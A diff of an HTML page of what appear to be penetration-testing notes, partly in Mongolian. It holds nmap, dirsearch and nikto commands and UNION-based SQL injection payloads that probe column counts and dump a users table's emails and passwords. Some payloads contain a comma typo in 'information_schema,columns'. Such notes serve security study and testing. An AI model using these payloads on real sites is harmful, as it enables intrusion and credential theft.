@@ -5,7 +5,8 @@ sudo nmap -sV -T4 -p- -O -oN nmap bravery
 -p- scan all ports
 -O identify Operating System
 -oN output to file, in our case it’s called nmap
-</code></pre></div></div><p><br /></p><h3 id="web-exploitation"> Web Exploitation <a href="#web-exploitation">#</a></h3><p><br /></p><h5 id="directory-bruteforcing"> Directory Bruteforcing <a href="#directory-bruteforcing">#</a></h5><p><br /></p><h5 id="nikto"> Nikto <a href="#nikto">#</a></h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nikto -h $HOST
+</code></pre></div></div><p><br /></p><h3 id="web-exploitation"> Web Exploitation <a href="#web-exploitation">#</a></h3><p><br /></p><h5 id="directory-bruteforcing"> Directory Bruteforcing <a href="#directory-bruteforcing">#</a></h5><p><br /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 dirsearch.py -u http://example.com
+</code></pre></div></div><h5 id="nikto"> Nikto <a href="#nikto">#</a></h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nikto -h $HOST
 </code></pre></div></div><p><br /></p><h5 id="sql-injection"> SQL Injection <a href="#sql-injection">#</a></h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' order by 1 --
 ' order by 1 -- -
 ' order by 2 --
@@ -16,7 +17,8 @@ sudo nmap -sV -T4 -p- -O -oN nmap bravery
 ' order by 7 --
 ' order by 8 --
 ' order by 9 --
-' union select 1,2,3,4,5,6,7,8 -- - ( Хэрвээ 4-р хэрэглэгчээр нэвтрэх юм бол )
+' union select 1,2,3,4,5,6,7,8 -- - 
+( Хэрвээ 4-р хэрэглэгчээр нэвтрэх юм бол )
 ' union select 1,2,3,@@version,5,6,7,8 -- -
 ' union select 1,2,3,user(),5,6,7,8 -- -
 
@@ -24,9 +26,11 @@ sudo nmap -sV -T4 -p- -O -oN nmap bravery
 
 ' union select 1,2,3,group_concat(column_name),5,6,7,8 from information_schema,columns where table_name='users'-- -
 
-' union select 1,2,3,column_name,5,6,7,8 from information_schema,columns where table_name='users'-- - ( Group-лээд гаргаж ирнэ )
+' union select 1,2,3,column_name,5,6,7,8 from information_schema,columns where table_name='users'-- - 
+( Group-лээд гаргаж ирнэ )
 
-' union select 1,2,3,group_concat(user_id,0x3a,first_name,0x3a,last_name,0x3a,email,0x3a, pass,0x3a,user_level),5,6,7,8 from users-- - ( table бүрийн урд хэсэгт 0x3a бичиж өгнө )
+' union select 1,2,3,group_concat(user_id,0x3a,first_name,0x3a,last_name,0x3a,email,0x3a, pass,0x3a,user_level),5,6,7,8 from users-- - 
+( table бүрийн урд хэсэгт 0x3a бичиж өгнө )
 
 File унших ( Read File )
 
